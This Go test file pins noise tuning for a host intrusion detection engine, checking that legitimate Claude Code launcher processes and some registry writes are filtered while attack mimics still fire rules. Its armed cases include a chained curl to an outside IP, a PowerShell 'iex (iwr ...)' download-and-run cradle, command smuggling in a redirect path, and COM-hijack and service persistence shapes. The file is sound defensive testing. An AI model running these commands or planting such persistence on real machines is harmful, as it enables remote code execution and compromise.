package rules

import (
	"testing"

	"sentinel/internal/event"
)

// Pins the 2026-11 noise tuning (window 10-07 -> 11-07). Quiet rows are the
// exact shapes captured from the live box; armed rows are the near-miss
// mimics each filter must NOT swallow.

const (
	claudeExe   = `C:\Users\jurij\.local\bin\claude.exe`
	sysCmd      = `C:\WINDOWS\System32\cmd.exe`
	sysPS       = `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe`
	launcherCmd = `C:\WINDOWS\System32\cmd.exe /d /s /c ""C:\WINDOWS\System32\chcp.com" 65001 >nul & "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript" > "C:\Users\jurij\AppData\Local\Temp\claude\ab51b3a862f70402\c6281ede-6f3f-480f-9a47-31c058c4e3e2\tasks\bq6dnedt9.output" 2>&1"`
	// Real capture carries TWO spaces after the quoted exe; foldCmdLine
	// collapses them, kept here to exercise that path.
	launcherPS = `"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"  -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript"`
)

func TestClaudeCodeShellLauncherQuiet(t *testing.T) {
	eng := realEngine(t)
	outer := eng.Evaluate(&event.Event{EID: 1, RecordID: 1, Image: sysCmd, ParentImage: claudeExe, CmdLine: launcherCmd})
	if ids := hitRuleIDs(outer); containsRule(ids, "EXEC-001") || containsRule(ids, "PERSIST-001") {
		t.Errorf("claude.exe launcher cmd should be filtered; got %v", ids)
	}
	inner := eng.Evaluate(&event.Event{EID: 1, RecordID: 2, Image: sysPS, ParentImage: sysCmd, ParentCmdLine: launcherCmd, CmdLine: launcherPS})
	if ids := hitRuleIDs(inner); containsRule(ids, "EXEC-001") || containsRule(ids, "PERSIST-001") {
		t.Errorf("launcher powershell under the launcher cmd should be filtered; got %v", ids)
	}
}

func TestClaudeCodeShellLauncherMimicsArmed(t *testing.T) {
	armed := []struct {
		name  string
		rules []string
		ev    event.Event
	}{
		{"launcher cmd under a non-claude parent", []string{"EXEC-001", "PERSIST-001"}, event.Event{EID: 1,
			Image: sysCmd, ParentImage: `C:\Users\jurij\Downloads\dropper.exe`, CmdLine: launcherCmd}},
		{"launcher cmd under claude.exe planted in Users\\Public", []string{"EXEC-001", "PERSIST-001"}, event.Event{EID: 1,
			Image: sysCmd, ParentImage: `C:\Users\Public\.local\bin\claude.exe`, CmdLine: launcherCmd}},
		{"launcher cmd with a second command chained after the redirect", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: sysCmd, ParentImage: claudeExe, CmdLine: launcherCmd + ` & curl http://203.0.113.9/x`}},
		{"launcher cmd whose redirect target smuggles a command", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: sysCmd, ParentImage: claudeExe,
			CmdLine: `C:\WINDOWS\System32\cmd.exe /d /s /c ""C:\WINDOWS\System32\chcp.com" 65001 >nul & "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript" > "C:\Users\jurij\AppData\Local\Temp\claude\ab\c6281ede-6f3f-480f-9a47-31c058c4e3e2\tasks\x & evil.output" 2>&1"`}},
		{"claude.exe-parented powershell with an inline payload", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: sysPS, ParentImage: claudeExe, CmdLine: `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr http://203.0.113.9/a)"`}},
		{"claude.exe-parented -EncodedCommand (left armed on purpose)", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: sysPS, ParentImage: claudeExe, CmdLine: `C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -EncodedCommand JABFAHIAcgBvAHIA`}},
		{"launcher powershell with no launcher parent cmdline", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: sysPS, ParentImage: sysCmd, ParentCmdLine: `cmd.exe /c run.bat`, CmdLine: launcherPS}},
		{"launcher powershell with a payload appended", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: sysPS, ParentImage: sysCmd, ParentCmdLine: launcherCmd, CmdLine: launcherPS + `; iex $x`}},
		{"launcher powershell image outside system32", []string{"EXEC-001"}, event.Event{EID: 1,
			Image: `C:\Users\jurij\AppData\Local\Temp\powershell.exe`, ParentImage: sysCmd, ParentCmdLine: launcherCmd, CmdLine: launcherPS}},
	}
	for _, a := range armed {
		ids := hitRuleIDs(realEngine(t).Evaluate(&a.ev))
		for _, r := range a.rules {
			if !containsRule(ids, r) {
				t.Errorf("%s: %s must stay armed; got %v", a.name, r, ids)
			}
		}
	}
}

func TestRegistryNoise202611Scoped(t *testing.T) {
	quiet := []struct {
		name, rule string
		ev         event.Event
	}{
		{"CredentialEnrollmentManagerUserSvc per-user ImagePath", "PERSIST-005", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\CredentialEnrollmentManagerUserSvc_f1b88\ImagePath`,
			Details:      `C:\WINDOWS\system32\CredentialEnrollmentManager.exe`}},
		{"Nahimic DataSystemCOM re-registration", "PERSIST-006", event.Event{EID: 13,
			Image:        `C:\Windows\System32\NahimicService.exe`,
			TargetRegKey: `HKCR\CLSID\{1FC71449-ACEC-420D-A3E9-7A0FC630926E}\InprocServer32\(Default)`,
			Details:      `C:\ProgramData\A-Volute\A-Volute.Nahimic\Modules\Regular\x64\DataSystemCOM.dll`}},
	}
	for _, q := range quiet {
		if ids := hitRuleIDs(realEngine(t).Evaluate(&q.ev)); containsRule(ids, q.rule) {
			t.Errorf("%s: should be filtered; got %v", q.name, ids)
		}
	}
	armed := []struct {
		name, rule string
		ev         event.Event
	}{
		{"CredentialEnrollment service name with an argument", "PERSIST-005", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\CredentialEnrollmentManagerUserSvc_f1b88\ImagePath`,
			Details:      `C:\WINDOWS\system32\CredentialEnrollmentManager.exe /c evil`}},
		{"CredentialEnrollment service name pointing into Temp", "PERSIST-005", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\CredentialEnrollmentManagerUserSvc_f1b88\ImagePath`,
			Details:      `C:\Users\jurij\AppData\Local\Temp\CredentialEnrollmentManager.exe`}},
		{"other service with the CredentialEnrollment ImagePath", "PERSIST-005", event.Event{EID: 13,
			Image:        `C:\Windows\System32\services.exe`,
			TargetRegKey: `HKLM\System\CurrentControlSet\Services\EvilSvc\ImagePath`,
			Details:      `C:\Users\Public\x.exe`}},
		{"Nahimic CLSID re-pointed to a user-writable DLL", "PERSIST-006", event.Event{EID: 13,
			Image:        `C:\Windows\System32\NahimicService.exe`,
			TargetRegKey: `HKCR\CLSID\{1FC71449-ACEC-420D-A3E9-7A0FC630926E}\InprocServer32\(Default)`,
			Details:      `C:\ProgramData\evil\DataSystemCOM.dll`}},
		{"Nahimic CLSID + DLL written by a different process", "PERSIST-006", event.Event{EID: 13,
			Image:        `C:\Users\jurij\Downloads\implant.exe`,
			TargetRegKey: `HKCR\CLSID\{1FC71449-ACEC-420D-A3E9-7A0FC630926E}\InprocServer32\(Default)`,
			Details:      `C:\ProgramData\A-Volute\A-Volute.Nahimic\Modules\Regular\x64\DataSystemCOM.dll`}},
		{"Nahimic DLL path in the user hive (true T1546.015 shape)", "PERSIST-006", event.Event{EID: 13,
			Image:        `C:\Windows\System32\NahimicService.exe`,
			TargetRegKey: `HKU\S-1-5-21-1-2-3-1001_Classes\CLSID\{1FC71449-ACEC-420D-A3E9-7A0FC630926E}\InprocServer32\(Default)`,
			Details:      `C:\ProgramData\A-Volute\A-Volute.Nahimic\Modules\Regular\x64\DataSystemCOM.dll`}},
	}
	for _, a := range armed {
		if !containsRule(hitRuleIDs(realEngine(t).Evaluate(&a.ev)), a.rule) {
			t.Errorf("%s: %s must stay armed", a.name, a.rule)
		}
	}
}

// NET-005 is collapsed per image (30m), never excepted: ephemeral-port churn
// from one image folds into one alert, while a different image always gets
// its own alert.
func TestNET005CollapsesPerImageNotAcrossImages(t *testing.T) {
	eng := realEngine(t)
	py := `C:\Users\jurij\AppData\Roaming\uv\python\cpython-3.12.13-windows-x86_64-none\python.exe`
	first := eng.Evaluate(&event.Event{EID: 3, RecordID: 1, Image: py, DstIP: "127.0.0.1", DstPort: 62799, DstProto: "tcp"})
	if !containsRule(hitRuleIDs(first), "NET-005") {
		t.Fatalf("first loopback connect from an image must alert; got %v", hitRuleIDs(first))
	}
	second := eng.Evaluate(&event.Event{EID: 3, RecordID: 2, Image: py, DstIP: "127.0.0.1", DstPort: 62805, DstProto: "tcp"})
	if containsRule(hitRuleIDs(second), "NET-005") || !containsSuppressed(second, "NET-005", "dedup-window") {
		t.Errorf("same image, new ephemeral port should be dedup-suppressed; hits %v supp %v", hitRuleIDs(second), suppRuleIDs(second))
	}
	other := eng.Evaluate(&event.Event{EID: 3, RecordID: 3, Image: `C:\Users\jurij\AppData\Local\Temp\driver.exe`, DstIP: "127.0.0.1", DstPort: 58172, DstProto: "tcp"})
	if !containsRule(hitRuleIDs(other), "NET-005") {
		t.Errorf("a different image on loopback must alert despite the python window; got %v", hitRuleIDs(other))
	}
}

func TestPiAgentNetQuietLoopbackArmed(t *testing.T) {
	pi := `C:\Users\jurij\Documents\Github external\pi-original\pi\packages\coding-agent\binaries\windows-x64\pi.exe`
	pub := realEngine(t).Evaluate(&event.Event{EID: 3, RecordID: 1, Image: pi, DstIP: "47.245.163.4", DstPort: 443, DstProto: "tcp"})
	if ids := hitRuleIDs(pub); containsRule(ids, "NET-002") || containsRule(ids, "NET-003") {
		t.Errorf("pi agent API traffic should be NET-quiet; got %v", ids)
	}
	lb := realEngine(t).Evaluate(&event.Event{EID: 3, RecordID: 2, Image: pi, DstIP: "127.0.0.1", DstPort: 58172, DstProto: "tcp"})
	if !containsRule(hitRuleIDs(lb), "NET-005") {
		t.Errorf("pi agent loopback must keep NET-005 armed; got %v", hitRuleIDs(lb))
	}
	mimic := realEngine(t).Evaluate(&event.Event{EID: 3, RecordID: 3, Image: `C:\Users\jurij\Downloads\pi.exe`, DstIP: "47.245.163.4", DstPort: 443, DstProto: "tcp"})
	if !containsRule(hitRuleIDs(mimic), "NET-002") {
		t.Errorf("pi.exe outside the built-binary path must fire NET-002; got %v", hitRuleIDs(mimic))
	}
}
